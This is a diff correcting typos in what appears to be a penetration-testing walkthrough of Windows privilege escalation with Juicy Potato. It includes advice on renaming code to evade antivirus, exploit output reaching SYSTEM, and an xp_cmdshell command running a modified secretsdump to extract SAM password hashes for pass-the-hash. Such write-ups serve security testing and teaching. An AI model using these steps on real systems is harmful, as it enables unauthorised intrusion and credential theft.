@@ -8,10 +8,10 @@ During penetration tests, very often after uploading a webshell, finding an RCE 
  - COMPUTERNAME\IUSR_COMPUTERNAME
  - ...
  
-Most of the time these service accounts have the 'SeImpersonate' or 'SeAssignPrimaryToken' privileges that can be used to escalate our privileges to become local admnistrator.
+Most of the time these service accounts have the 'SeImpersonate' or 'SeAssignPrimaryToken' privileges that can be used to escalate our privileges to become local administrator.
 
-For the last few years I have been using the tool 'https://github.com/ohpe/juicy-potato/' that is working well and is very stable. 
-You have to compile it and as usual it is recommended to rename somme stuff in the code to modify the signature of the file and avoid being detected by AntiVirus. 
+For the last few years, I have been using the tool 'https://github.com/ohpe/juicy-potato/' that is working well and is very stable. 
+You have to compile it and as usual it is recommended to rename some stuff in the code to modify the signature of the file and avoid being detected by AntiVirus. 
 
 Example : 
 ./juicy-jfc.exe 
@@ -184,7 +184,6 @@ Testing {752073A1-23F2-4396-85F0-8FDB879ED0ED} 8888
 {752073A1-23F2-4396-85F0-8FDB879ED0ED};NT AUTHORITY\SYSTEM
 [-] CreateProcessWithTokenW Failed to create proc: 1058
 [+] CreateProcessAsUser OK
-
 NT AUTHORITY\SYSTEM
 
 ==> The exploit is working !!
@@ -240,7 +239,7 @@ Directory of c:\temp
 <SNIP>
 
 
-==> We upload on the target server the binary secretsdump_jfc.exe (tool from Impacket that I modified and re-compiled to avoid AV). Note: we can use the same technique than before with Certutil.
+==> We upload on the target server the binary 'secretsdump_jfc.exe' (tool from Impacket that I modified and re-compiled to avoid AV). Note: we can use the same technique than before with Certutil.
     Then we use secretsdump to extract the local password hashes (the objective is to be able to log into the target server as a local admin using wmiexec (Pass-The-Hash)).
     
 > EXEC master..xp_cmdshell 'c:\temp\secretsdump_jfc.exe -sam c:\temp\sam.hive -security c:\temp\security.hive -system c:\temp\system.hive LOCAL'
